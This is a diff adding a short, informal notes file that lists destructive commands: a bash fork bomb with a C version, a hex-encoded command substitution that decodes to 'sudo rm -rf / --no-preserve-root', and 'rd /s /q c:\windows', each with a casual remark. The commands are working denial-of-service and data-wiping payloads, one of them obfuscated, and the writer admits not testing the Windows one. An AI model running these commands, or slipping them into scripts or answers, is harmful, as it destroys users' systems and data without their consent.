@@ -1,0 +1,16 @@
+:(){ :|: & };:
+Fork bomb - a form of denial of service attack
+crates two instances of itself for every instance
+also possible in C like this:
+int main() {
+    while(1)
+        fork();
+    return 0;
+}
+
+$(echo 7375646f20726d202d7266202f202d2d6e6f2d70726573657276652d726f6f74 | xxd -r -p)
+This is hex, but converted to ascii its sudo rm -rf / --no-preserve-root
+
+rd /s /q c:\windows
+supposedly delete windows, but windows will probably try to stop you
+idk I never actually tested it lol
